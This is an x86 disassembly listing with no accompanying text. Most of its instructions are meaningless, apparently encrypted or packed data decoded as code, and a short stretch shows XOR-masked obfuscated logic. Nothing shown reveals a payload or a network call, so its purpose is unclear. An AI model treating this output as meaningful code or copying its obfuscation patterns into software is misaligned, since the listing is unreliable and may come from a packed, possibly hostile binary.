  4039d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d5:	or     ah,dh
  4039d7:	arpl   sp,si
  4039d9:	repz daa 
  4039db:	xchg   edx,eax
  4039dc:	pop    edx
  4039dd:	push   0xdbd2f7fb
  4039e2:	push   edx
  4039e3:	mov    bh,0x3d
  4039e5:	loop   0x403989
  4039e7:	(bad)  
  4039e8:	xchg   edi,eax
  4039e9:	mov    ah,0x26
  4039eb:	push   0xd9c81d62
  4039f0:	idiv   DWORD PTR [ebx+0x29]
  4039f3:	cmc    
  4039f4:	(bad)  
  4039f5:	pop    esi
  4039f6:	and    ecx,0xc96a2526
  4039fc:	lock fdivrp st(5),st
  4039ff:	jg     0x403a32
  403a01:	test   DWORD PTR [ebp+0x4f],edi
  403a04:	cmp    eax,DWORD PTR fs:[ebx-0x4f02c2ff]
  403a0b:	retf   
  403a0c:	(bad)  
  403a0d:	xor    BYTE PTR [eax-0x6],bl
  403a10:	inc    ebx
  403a11:	jne    0x4039f9
  403a13:	push   cs
  403a14:	sti    
  403a15:	mov    ah,0xe2
  403a17:	inc    ebx
  403a18:	or     bh,BYTE PTR gs:[esp+eiz*4+0x667bc2e1]
  403a20:	in     al,0xcd
  403a22:	push   es
  403a23:	mov    cl,BYTE PTR [ebp-0x3e]
  403a26:	sub    dl,BYTE PTR [edx-0x59eb042e]
  403a2c:	jno    0x4039e9
  403a2e:	mov    al,0x8f
  403a30:	repnz aas 
  403a32:	stc    
  403a33:	js     0x403a4f
  403a35:	scas   eax,DWORD PTR es:[edi]
  403a36:	rcl    DWORD PTR [edi+0x45],cl
  403a39:	(bad)  
  403a3a:	lds    esp,FWORD PTR [eax]
  403a3c:	ror    ah,cl
  403a3e:	nop
  403a3f:	add    bh,BYTE PTR gs:[esi+0x4f]
  403a43:	mov    ebx,0xe8006704
  403a48:	cmp    BYTE PTR [esi-0x3dc6b1da],bh
  403a4e:	mov    dh,0x6f
  403a50:	or     eax,0x3171bb2d
  403a55:	sbb    bh,BYTE PTR [edx-0x4ba49577]
  403a5b:	out    dx,al
  403a5c:	loope  0x403ab1
  403a5e:	out    dx,eax
  403a5f:	inc    ebp
  403a60:	sar    DWORD PTR [ebx+eax*4],0x8d
  403a64:	mov    cl,0x7e
  403a66:	out    0x99,eax
  403a68:	add    eax,0xc8a79baa
  403a6d:	jmp    0xbc994159
  403a72:	retf   
  403a73:	mov    ah,0xf5
  403a75:	lods   eax,DWORD PTR ds:[esi]
  403a76:	cmp    BYTE PTR [eax+0x65e8bc5a],0xf4
  403a7d:	push   edi
  403a7e:	ja     0x403a0e
  403a80:	push   edx
  403a81:	ja     0x403a30
  403a83:	mov    DWORD PTR [ebp+0x2f246bc1],esi
  403a89:	iret   
  403a8a:	mov    dh,0x65
  403a8c:	cmp    DWORD PTR [esp+eiz*8+0x4f],eax
  403a90:	cli    
  403a91:	test   al,0x1d
  403a93:	mov    ds:0x1011880a,eax
  403a98:	jmp    0xf6db:0xde88d303
  403a9f:	test   eax,0xebc57415
  403aa4:	cs jae 0x403b25
  403aa7:	imul   esp,DWORD PTR [edi-0x12d57f39],0x968fb9cc
  403ab1:	loopne 0x403ab5
  403ab3:	ret    0xe4c7
  403ab6:	pop    edi
  403ab7:	addr16 cmp al,0x4b
  403aba:	dec    ecx
  403abb:	mov    ch,0x3
  403abd:	and    al,0xd4
  403abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ac0:	shl    BYTE PTR [esi+0x1a],0xac
  403ac4:	mov    ecx,0x1d3f1643
  403ac9:	push   0x10
  403acb:	xchg   esp,eax
  403acc:	dec    edi
  403acd:	sbb    eax,0x52514ada
  403ad2:	call   0xe26295a7
  403ad7:	dec    esi
  403ad8:	loop   0x403b37
  403ada:	repnz xor BYTE PTR [ecx+0x42b00d2c],cl
  403ae1:	lds    ebx,FWORD PTR [edi-0x18241755]
  403ae7:	add    eax,0xcbd53892
  403aec:	push   ss
  403aed:	std    
  403aee:	sub    eax,0xec800b1
  403af3:	add    al,BYTE PTR [eax+ebp*4+0x3538bfa5]
  403afa:	jo     0x403ae2
  403afc:	adc    esp,DWORD PTR [ecx+ebp*1+0x5bad52b3]
  403b03:	dec    edi
  403b04:	bound  esp,QWORD PTR [ecx+0x69360545]
  403b0a:	xor    eax,0xa636670a
  403b0f:	out    dx,eax
  403b10:	cmp    al,0xa6
  403b12:	in     al,0x2c
  403b14:	cmp    edx,ecx
  403b16:	mov    ecx,DWORD PTR [ebp-0xc]
  403b19:	mov    DWORD PTR [ebp+0x8],ecx
  403b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  403b1f:	je     0x406073
  403b25:	jmp    0x403b5a
  403b2a:	mov    ecx,DWORD PTR [ebp+0x8]
  403b2d:	mov    edx,DWORD PTR [ebp-0x8]
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp-0x7d450b8b]
  403bc0:	inc    esp
  403bc1:	test   al,0x1c
  403bc3:	pop    edi
  403bc4:	bound  esp,QWORD PTR [edx+0x1c]
  403bc7:	pop    edi
  403bc8:	bound  esp,QWORD PTR [edx+0x28]
  403bcb:	in     al,0xea
  403bcd:	iret   
  403bce:	adc    al,0x47
  403bd0:	lahf   
  403bd1:	xor    bl,ch
  403bd3:	push   ecx
  403bd4:	(bad)  
  403bd5:	mov    ah,0x9e
  403bd7:	xor    al,0x7b
  403bd9:	push   eax
  403bda:	jge    0x403b9c
  403bdc:	(bad)  
  403bdd:	out    0x68,eax
  403bdf:	(bad)  
  403be0:	pop    ds
  403be1:	xchg   esp,eax
  403be2:	push   ds
  403be3:	mov    eax,0xe2c1461b
  403be8:	inc    esp
  403be9:	ins    DWORD PTR es:[edi],dx
  403bea:	call   0x2c68782c
  403bef:	sar    ah,1
  403bf1:	shr    DWORD PTR [edi-0x4f],cl
  403bf4:	in     eax,0x41
  403bf6:	adc    DWORD PTR [ebp-0x7287a4c],edx
  403bfc:	sbb    al,0x89
  403bfe:	sub    al,0x40
  403c01:	adc    DWORD PTR [eax-0x66],esp
  403c04:	add    eax,0x1570fe3f
  403c09:	jne    0x403c1f
  403c0b:	int3   
  403c0c:	or     al,0x91
  403c0e:	xor    DWORD PTR [eax-0x10b63130],esp
  403c14:	sbb    DWORD PTR [edi+0xcfdf844],eax
  403c1a:	push   ecx
  403c1b:	xor    DWORD PTR [eax+ecx*1],0xffffff9a
  403c1f:	scas   eax,DWORD PTR es:[edi]
  403c20:	pop    ds
  403c21:	jmp    0xc1678d24
  403c26:	mov    eax,0x616e90a2
  403c2b:	push   ebp
  403c2c:	push   0x5d168a6c
  403c31:	mov    WORD PTR [edx-0x2834029d],fs
  403c37:	sub    ah,BYTE PTR [esi]
  403c39:	les    edi,FWORD PTR [esi]
  403c3b:	push   0x5e015d43
  403c40:	or     ebp,DWORD PTR [eax-0x6127db3e]
  403c46:	ins    DWORD PTR es:[edi],dx
  403c47:	inc    esi
  403c48:	lock xchg ecx,eax
  403c4a:	sbb    eax,DWORD PTR [eax+0x7fa5c767]
  403c50:	jne    0x403bf2
  403c52:	inc    ecx
  403c53:	cmp    al,0x4f
  403c55:	push   0x28
  403c57:	int3   
  403c58:	repnz in al,dx
  403c5a:	daa    
  403c5b:	add    bl,ch
  403c5d:	fsub   QWORD PTR [esi-0x5b021826]
  403c63:	jne    0x403c9b
  403c65:	div    BYTE PTR [ecx-0x17]
  403c68:	ss js  0x403c3b
  403c6b:	sbb    bl,ah
  403c6d:	out    0x4d,al
  403c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c70:	out    0x87,al
  403c72:	jns    0x403c4e
  403c74:	ret    
  403c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c76:	mov    al,ds:0x527bdcdf
  403c7b:	cmp    BYTE PTR [edi-0x6dc3f08b],al
  403c81:	ins    BYTE PTR es:[edi],dx
  403c82:	bound  edi,QWORD PTR [edi-0x13fdad5a]
  403c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c89:	fidiv  WORD PTR [ecx]
  403c8b:	sahf   
  403c8c:	sbb    BYTE PTR [ebp+0x44e81123],ah
  403c92:	mov    dl,0x66
  403c94:	in     al,dx
  403c95:	scas   eax,DWORD PTR es:[edi]
  403c96:	sti    
  403c97:	jb     0x403c87
  403c99:	mov    edi,0x22c0124b
  403c9e:	mov    edx,DWORD PTR [edi-0x675d3193]
  403ca4:	dec    ebp
  403ca5:	sub    BYTE PTR [ecx],0x46
  403ca8:	and    BYTE PTR [ebx+0x49],ch
  403cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cad:	fdiv   DWORD PTR [edi]
  403caf:	test   BYTE PTR [edx+0x1d],ah
  403cb2:	popf   
  403cb3:	sub    eax,0xf136d04e
  403cb8:	gs jle 0x403cea
  403cbb:	(bad)  
  403cbc:	into   
  403cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cbe:	and    al,0xa3
  403cc0:	inc    ecx
  403cc1:	dec    edx
  403cc2:	scas   eax,DWORD PTR es:[edi]
  403cc3:	pop    esp
  403cc4:	dec    ebp
  403cc5:	and    dh,bh
  403cc7:	call   0x3008e0d4
  403ccc:	ja     0x403c66
  403cce:	mov    ds:0x39bbdc3b,eax
  403cd3:	jg     0x403cd4
  403cd5:	sbb    eax,DWORD PTR [ebx-0x1fa4cc98]
  403cdb:	call   0x53acc445
  403ce0:	test   DWORD PTR [esi-0x2a9dfccb],ebx
  403ce6:	xor    DWORD PTR [bp+si-0x42],edx
  403cea:	popa   
  403ceb:	je     0x403c75
  403ced:	mov    ds:0xe148c837,al
  403cf3:	add    DWORD PTR [ecx+esi*4-0x67],0x5e
  403cf8:	and    DWORD PTR [esi-0x3b4f4790],edi
  403cfe:	clc    
  403cff:	fucom  st(5)
  403d01:	mov    ah,0x65
  403d03:	push   0x97fa184c
  403d08:	push   0xa79c870e
  403d0d:	shl    BYTE PTR [eax-0x55a1025b],1
  403d13:	mov    eax,0x9e690687
  403d18:	mov    esp,?
  403d1a:	adc    bh,BYTE PTR [esp+ebp*2]
  403d1d:	fwait
  403d1e:	adc    dh,BYTE PTR [ecx]
  403d20:	xchg   esp,eax
  403d21:	jae    0x403ccc
  403d23:	lds    edx,FWORD PTR [eax+0x2e7ec8ac]
  403d29:	les    eax,FWORD PTR [ecx+0x263cc2f3]
  403d2f:	or     eax,0x755d06ea
  403d34:	inc    eax
  403d35:	loope  0x403d47
  403d37:	mov    ebx,0x9baff0c
  403d3c:	mov    BYTE PTR [edi-0x1c],ch
  403d3f:	push   ds
  403d40:	adc    BYTE PTR [esp+ebx*2+0x1b],dl
  403d44:	adc    dh,BYTE PTR [ebp+0x4a6ebe70]
  403d4a:	and    al,0xac
  403d4c:	sub    dl,BYTE PTR [ecx+0x8]
  403d4f:	leave  
  403d50:	pushf  
  403d51:	je     0x403d4b
  403d53:	add    edi,esi
  403d55:	neg    DWORD PTR [ebx+ebp*4+0xfe1f82]
  403d5c:	sub    esi,DWORD PTR [ebx+0x390d0693]
  403d62:	add    ch,cl
  403d64:	ror    dl,0x57
  403d67:	aas    
  403d68:	xor    ebx,esp
  403d6a:	data16 ds xor cl,dh
  403d6e:	stos   BYTE PTR es:[edi],al
  403d6f:	adc    BYTE PTR [esi-0x4f6dcd58],cl
  403d75:	repnz and DWORD PTR [edi+0x4b],0x75
  403d7a:	call   0xb15d:0x442624e2
  403d81:	retf   0x1629
  403d84:	push   es
  403d85:	popa   
  403d86:	clc    
  403d87:	aam    0x6c
  403d89:	adc    bh,BYTE PTR [esi-0x35]
  403d8c:	mov    ds,WORD PTR [esi+0x12]
  403d8f:	fbld   TBYTE PTR [esi]
  403d91:	out    0x22,al
  403d93:	cmp    dh,BYTE PTR [eax+0x32]
  403d96:	sub    al,0x12
  403d98:	dec    ebx
  403d99:	hlt    
  403d9a:	shl    BYTE PTR [edx-0x65a4582f],1
  403da0:	fs pushf 
  403da2:	sub    BYTE PTR [edi+0x36],dl
  403da5:	add    eax,0x1818abea
  403daa:	(bad)  
  403dab:	push   cs
  403dac:	inc    edx
  403dad:	js     0x403d37
  403daf:	mov    edx,0x8618639c
  403db4:	js     0x403d9f
  403db6:	inc    esi
  403db7:	sub    esp,edi
  403db9:	ja     0x403df8
  403dbb:	cmp    al,0x89
  403dbd:	sar    DWORD PTR [edi],0xc4
  403dc0:	rcl    DWORD PTR [edi-0x33],1
  403dc3:	fsub   QWORD PTR [edi-0x66954bf]
  403dc9:	push   ds
  403dca:	loopne 0x403dad
  403dcc:	(bad)  
  403dcd:	std    
  403dce:	dec    edx
  403dcf:	scas   eax,DWORD PTR es:[edi]
  403dd0:	adc    eax,0xbe303a2
  403dd5:	mov    ebx,0x4c9ac8a5
  403dda:	or     eax,0x84cf7eb6
  403de0:	adc    al,0xd0
  403de2:	popf   
  403de3:	rcr    BYTE PTR [ecx+0x377420b4],cl
  403de9:	mov    ds:0x56e0a5c5,eax
  403dee:	sub    eax,0xfd4edd3a
  403df3:	(bad)  
  403df4:	pop    edx
  403df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403df7:	cld    
  403df8:	lods   al,BYTE PTR ds:[esi]
  403df9:	add    al,0x25
  403dfb:	cli    
  403dfc:	(bad)  
  403dfd:	or     DWORD PTR [edi+esi*2-0x58],ebp
  403e01:	mov    dl,0x9c
  403e03:	cmc    
  403e04:	sbb    bh,BYTE PTR [edx]
  403e06:	int    0x9b
  403e08:	test   eax,0x3efa0d50
  403e0d:	out    dx,eax
  403e0e:	hlt    
  403e0f:	pop    ss
  403e10:	call   0x97d1:0x76549a12
  403e17:	push   ss
  403e18:	adc    ah,BYTE PTR [eax-0x359b14be]
  403e1e:	(bad)  
  403e1f:	sbb    eax,DWORD PTR [ecx]
  403e21:	inc    ebx
  403e22:	repnz out 0xeb,al
  403e25:	ret    
  403e26:	xchg   ecx,eax
  403e27:	jns    0x403df2
  403e29:	ror    DWORD PTR [esi+0x571a05be],0xae
  403e30:	xchg   ecx,eax
  403e31:	lock and BYTE PTR [eax+edx*2+0x38d38b7d],dh
  403e39:	inc    ecx
  403e3a:	cmpps  xmm7,xmm2,0x93
  403e3e:	dec    edx
  403e3f:	sub    ch,ah
  403e41:	nop
  403e42:	cmc    
  403e43:	gs dec eax
  403e45:	cmc    
  403e46:	nop
  403e47:	cmp    BYTE PTR [ebx+0x78],bh
  403e4a:	daa    
  403e4b:	inc    ebp
  403e4c:	xlat   BYTE PTR ds:[ebx]
  403e4d:	mov    ebx,0xcc2c5dc1
  403e52:	adc    DWORD PTR [ebp-0x46],0xba70ffc4
  403e59:	sub    al,0x54
  403e5b:	nop
  403e5c:	dec    ecx
  403e5d:	adc    dh,BYTE PTR [edi+0x16bc76e3]
  403e63:	mov    cl,0x91
  403e65:	mov    ch,0xc4
  403e67:	pop    esi
  403e68:	jne    0x403e32
  403e6a:	pop    esp
  403e6b:	scas   al,BYTE PTR es:[edi]
  403e6c:	or     bh,BYTE PTR [ecx]
  403e6e:	adc    edi,DWORD PTR [bx+0x4d10]
  403e73:	retf   0xaa73
  403e76:	mov    ?,WORD PTR [ebx-0x4d2b7c77]
  403e7c:	gs call 0xf5c91c90
  403e82:	mov    esp,eax
  403e84:	sbb    al,0xcc
  403e86:	repnz mov ds:0xae340ea5,al
  403e8c:	xor    DWORD PTR [ebx],0xffffffc9
  403e8f:	xchg   esi,eax
  403e90:	inc    edi
  403e91:	jmp    0xafab:0xfd2b4157
  403e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e99:	aam    0x77
  403e9b:	cmp    dl,0x7c
  403e9e:	xchg   edi,eax
  403e9f:	xor    DWORD PTR [esi-0x14f1b7f3],eax
  403ea5:	pop    es
  403ea6:	loope  0x403e35
  403ea8:	in     eax,dx
  403ea9:	pop    eax
  403eaa:	cmp    BYTE PTR ds:0x31ffa500,bl
  403eb0:	sbb    bl,bl
  403eb2:	or     al,0xf
  403eb4:	jns    0x403e7e
  403eb6:	push   edi
  403eb7:	scas   eax,DWORD PTR es:[edi]
  403eb8:	mov    dh,0xe
  403eba:	xchg   ebx,eax
  403ebb:	or     DWORD PTR [edi+0x13],edx
  403ebe:	sub    BYTE PTR [edx-0x3715e518],0xd0
  403ec5:	cld    
  403ec6:	mov    eax,0xbcb46236
  403ecb:	xchg   edx,eax
  403ecc:	stos   BYTE PTR es:[edi],al
  403ecd:	popf   
  403ece:	cmc    
  403ecf:	ficom  DWORD PTR [eax+0x6fafadb4]
  403ed5:	rcl    BYTE PTR [edi],1
  403ed7:	cdq    
  403ed8:	int3   
  403ed9:	arpl   WORD PTR [edx-0x7518382f],di
  403edf:	and    dh,bh
  403ee1:	mov    ah,BYTE PTR [ebx]
  403ee3:	test   DWORD PTR [ebp+0x69ce06ba],0xed7dfc9f
  403eed:	xor    al,0x10
  403eef:	add    eax,0x71d15e0f
  403ef4:	outs   dx,DWORD PTR ds:[esi]
  403ef5:	lea    eax,[eax-0x1ba367c7]
  403efb:	sbb    esi,DWORD PTR [ecx]
  403efd:	popa   
  403efe:	xor    dh,bh
  403f00:	inc    edx
  403f01:	inc    edi
  403f02:	adc    BYTE PTR [ebp+0x2e],0xbe
  403f06:	sti    
  403f07:	icebp  
  403f08:	(bad)  
  403f09:	adc    eax,0xc77f282f
  403f0e:	jno    0x403edd
  403f10:	pop    ss
  403f11:	lahf   
  403f12:	jnp    0x403eae
  403f14:	in     al,0x2d
  403f16:	test   DWORD PTR [ecx],ebp
  403f18:	jmp    ecx
  403f1a:	push   ecx
  403f1b:	jg     0x403f28
  403f1d:	xor    bl,BYTE PTR [edi+ebx*4-0x40]
  403f21:	mov    esi,0x5e66901a
  403f26:	setle  BYTE PTR [edi+eiz*2+0x38]
  403f2b:	mov    ah,BYTE PTR [edi+0x2f93dcdb]
  403f31:	ins    DWORD PTR es:[edi],dx
  403f32:	test   al,0x6e
  403f34:	xlat   BYTE PTR ds:[ebx]
  403f35:	cmp    ebp,DWORD PTR [ebp+0x7838e974]
  403f3b:	mov    edx,ss
  403f3d:	add    BYTE PTR cs:[ebp+edx*4+0x12],al
  403f42:	out    0x25,al
  403f44:	mov    esi,0x83e4002
  403f49:	jmp    0x86ecbc7
  403f4e:	in     al,0xa1
  403f50:	mov    al,ds:0xb1e46b64
  403f55:	dec    esp
  403f56:	jnp    0x403ef3
  403f58:	in     eax,dx
  403f59:	popf   
  403f5a:	push   es
  403f5b:	xchg   edx,eax
  403f5c:	sub    ebx,DWORD PTR [edx-0x5d]
  403f5f:	(bad)  
  403f60:	iret   
  403f61:	or     ecx,DWORD PTR [ebx-0x53b5709e]
  403f67:	inc    ebp
  403f68:	int3   
  403f69:	adc    al,0xb9
  403f6b:	sub    DWORD PTR [edx+0x75],esi
  403f6e:	sahf   
  403f6f:	adc    al,0x75
  403f71:	fild   DWORD PTR [eax+0x74a1c3ac]
  403f77:	cmp    BYTE PTR [ebp+0x1a],0x1a
  403f7b:	aam    0x59
  403f7d:	push   edi
  403f7e:	mov    edi,0xd2d9f9e8
  403f83:	fimul  DWORD PTR [edi+esi*8+0x21a9bf02]
  403f8a:	jae    0x403f3c
  403f8c:	pop    esp
  403f8d:	mov    ch,0x49
  403f8f:	sub    al,0xf0
  403f91:	cwde   
  403f92:	sbb    dh,cl
  403f94:	push   es
  403f95:	outs   dx,BYTE PTR ds:[esi]
  403f96:	pop    eax
  403f97:	mov    esi,0x3c10192e
  403f9c:	dec    edx
  403f9d:	sar    dl,0x41
  403fa0:	ds sbb bh,bl
  403fa3:	mov    ?,edi
  403fa5:	mov    ah,0xb6
  403fa7:	test   DWORD PTR ds:0x6a5043fe,eax
  403fad:	jae    0x403fdd
  403faf:	sbb    eax,0xa57cdbc6
  403fb4:	std    
  403fb5:	repz (bad) 
  403fb7:	fsubp  st(1),st
  403fb9:	push   eax
  403fba:	out    dx,al
  403fbb:	fsub   st,st(5)
  403fbd:	retf   
  403fbe:	es dec ebx
  403fc0:	repz ret 0x1517
  403fc4:	inc    esp
  403fc5:	sub    esp,DWORD PTR [eax+0x16281a93]
  403fcb:	pop    esi
  403fcc:	scas   al,BYTE PTR es:[edi]
  403fcd:	int    0xc3
  403fcf:	mov    al,BYTE PTR [ecx+0x7e4a3e07]
  403fd5:	adc    BYTE PTR [ecx+0x19],dh
  403fd8:	mov    eax,0xa6d7173c
  403fdd:	cmp    BYTE PTR [esi+0x1ce27602],ah
  403fe3:	push   0x4b
  403fe5:	int    0x8b
  403fe7:	push   eax
  403fe8:	and    eax,0x87812177
  403fed:	scas   al,BYTE PTR es:[edi]
  403fee:	add    DWORD PTR [ecx+0x6453030c],ebp
  403ff4:	add    ebp,edx
  403ff6:	mov    ch,0xc8
  403ff8:	add    eax,0xdd983be8
  403ffd:	xchg   BYTE PTR [eax+eiz*2],dh
  404000:	xor    al,0x29
  404002:	xor    cl,cl
  404004:	adc    eax,0x872c0976
  404009:	addr16 jmp 0x403fbf
  40400c:	dec    ebx
  40400d:	sub    ebp,esp
  40400f:	cdq    
  404010:	outs   dx,DWORD PTR ds:[esi]
  404011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404012:	fld    QWORD PTR [ebx-0x54]
  404015:	jo     0x404074
  404017:	repnz pop ebx
  404019:	ror    DWORD PTR [ecx+eax*4-0x1c],1
  40401d:	xchg   BYTE PTR ds:0x47f62606,ch
  404023:	sub    DWORD PTR [ebp+ebp*4+0x44698686],esi
  40402a:	fidivr WORD PTR [edi-0x46]
  40402d:	mov    edi,0x3d4576ad
  404032:	mov    al,0xbc
  404034:	ins    BYTE PTR es:[edi],dx
  404035:	imul   edx,DWORD PTR [esi],0x7f
  404038:	mov    al,0xe6
  40403a:	pop    ecx
  40403b:	add    al,BYTE PTR [esi]
  40403d:	inc    esp
  40403e:	ja     0x404006
  404040:	mov    ebp,0x6e721ca0
  404045:	xor    BYTE PTR [ecx+0x27],dl
  404048:	imul   edi,DWORD PTR [edx-0x5],0x41846645
  40404f:	pop    eax
  404050:	sbb    BYTE PTR [ecx+0x47],ch
  404053:	cmp    al,BYTE PTR [ecx+ebp*2-0xc]
  404057:	enter  0xc359,0xa4
  40405b:	les    edx,FWORD PTR [esi]
  40405d:	retf   
  40405e:	adc    edi,0x36b49fb0
  404064:	out    0xb5,al
  404066:	push   ds
  404067:	int    0xb6
  404069:	retf   
  40406a:	nop
  40406b:	pop    es
  40406c:	sbb    BYTE PTR [ebp+ebx*4-0x3cd02a1c],0xd2
  404074:	rol    al,1
  404076:	lods   eax,DWORD PTR ds:[esi]
  404077:	push   ss
  404078:	hlt    
  404079:	mov    esi,0xef9bf446
  40407e:	outs   dx,BYTE PTR ds:[esi]
  40407f:	stc    
  404080:	mov    WORD PTR [ebp+0x69],gs
  404083:	pop    es
  404084:	sti    
  404085:	lock adc al,0x29
  404088:	sub    BYTE PTR [esi+0x25],0x72
  40408c:	popa   
  40408d:	mov    esp,ecx
  40408f:	sbb    al,0x39
  404091:	fwait
  404092:	or     DWORD PTR ds:0x67060a8f,ebx
  404098:	pop    ebp
  404099:	scas   eax,DWORD PTR es:[edi]
  40409a:	adc    esi,DWORD PTR es:[ecx]
  40409d:	retf   0xfb88
  4040a0:	outs   dx,DWORD PTR ds:[esi]
  4040a1:	lea    edx,[ebx-0x3f]
  4040a4:	(bad)  
  4040a5:	in     al,dx
  4040a6:	dec    eax
  4040a7:	xlat   BYTE PTR ds:[ebx]
  4040a8:	sub    ah,BYTE PTR [ecx-0x21153ff1]
  4040ae:	xchg   DWORD PTR [eax],edx
  4040b0:	psllw  mm0,QWORD PTR [eax]
  4040b3:	jb     0x404119
  4040b5:	and    al,0x39
  4040b7:	test   DWORD PTR [ebp+0x3e],edx
  4040ba:	adc    DWORD PTR [ebp-0x1d],eax
  4040bd:	pop    ecx
  4040be:	std    
  4040bf:	push   edx
  4040c0:	fcom   DWORD PTR [edi-0x6d]
  4040c3:	mov    ds:0xa78f65d,eax
  4040c8:	(bad)  
  4040c9:	mov    ds:0xf6a00d9a,eax
  4040ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040cf:	mov    bh,ah
  4040d1:	nop
  4040d2:	sub    bl,dh
  4040d4:	in     al,dx
  4040d5:	es enter 0x8067,0xe1
  4040da:	data16 mov ds:0x805d9bb8,al
  4040e0:	int    0x8b
  4040e2:	jmp    0x9e63cadc
  4040e7:	retf   0x4cc
  4040ea:	sti    
  4040eb:	fcmovnb st,st(4)
  4040ed:	sbb    BYTE PTR es:[ecx+0x60],cl
  4040f1:	and    DWORD PTR [eax+0x54],ebp
  4040f4:	sub    esp,edx
  4040f6:	pop    edi
  4040f7:	(bad)  
  4040f8:	jno    0x4040b2
  4040fa:	mov    bh,0xd4
  4040fc:	mov    ?,eax
  4040fe:	mov    ebp,DWORD PTR [esi]
  404100:	inc    ebp
  404101:	xchg   DWORD PTR [ebp-0x333ac5c8],ebp
  404107:	lahf   
  404108:	js     0x40414d
  40410a:	jmp    0x48b3:0x9c5a1497
  404111:	(bad)
  404115:	fiadd  WORD PTR [esi+0x48a00351]
  40411b:	jl     0x40417b
  40411d:	shl    DWORD PTR [edx-0x622650a3],0x5b
  404124:	jbe    0x404139
  404126:	mov    esi,0x5c90146e
  40412b:	and    al,0x6c
  40412d:	xor    al,0x66
  40412f:	push   ebp
  404130:	sbb    BYTE PTR [esp+eiz*2],ch
  404133:	jns    0x404183
  404135:	add    BYTE PTR [edi+0x53cf89cf],cl
  40413b:	sar    DWORD PTR [ebp+0x5943dba6],cl
  404141:	mov    ds:0xcdbc5672,eax
  404146:	cs push eax
  404148:	pop    esp
  404149:	ss or  eax,0xa110df91
  40414f:	jmp    0x404195
  404151:	repnz push ss
  404153:	stos   DWORD PTR es:[edi],eax
  404154:	sar    BYTE PTR [eax+edi*8],1
  404157:	ss pop ebx
  404159:	inc    ebp
  40415a:	pop    ecx
  40415b:	pop    DWORD PTR [ecx]
  40415d:	xor    BYTE PTR [esp+eax*4-0x5c],bl
  404161:	pop    ds
  404162:	jmp    0x83fe87ca
  404167:	push   esi
  404168:	add    BYTE PTR [ecx],ah
  40416a:	mov    gs,WORD PTR [eax+0xc]
  40416d:	xchg   BYTE PTR [ecx],dh
  40416f:	js     0x4041ec
  404171:	das    
  404172:	es dec esi
  404174:	fistp  DWORD PTR [edi+edx*4-0xe2fb07e]
  40417b:	sub    ebp,ebp
  40417d:	inc    esi
  40417e:	outs   dx,BYTE PTR ds:[esi]
  40417f:	jp     0x4041e1
  404181:	in     al,0x6e
  404183:	daa    
  404184:	fnsave [eax-0x4bcc7ddf]
  40418a:	cmp    esp,DWORD PTR [edx+0x4cdad6ae]
  404190:	and    ch,BYTE PTR [eax-0x48]
  404193:	inc    ebp
  404194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404195:	fdiv   st(3),st
  404197:	popf   
  404198:	loopne 0x4041b0
  40419a:	xchg   ebx,eax
  40419b:	aad    0x21
  40419d:	inc    esp
  40419e:	xor    edx,DWORD PTR [eax+esi*8]
  4041a1:	add    ebx,edx
  4041a3:	sahf   
  4041a4:	add    DWORD PTR [ebp+0x2cc900c8],eax
  4041aa:	lods   al,BYTE PTR ds:[esi]
  4041ab:	add    BYTE PTR [ecx],ah
  4041ad:	nop
  4041ae:	cs ret 
  4041b0:	xchg   ecx,eax
  4041b1:	inc    ebx
  4041b2:	int    0x8f
  4041b4:	ds ret 0x7853
  4041b8:	jecxz  0x404177
  4041ba:	ss in  eax,dx
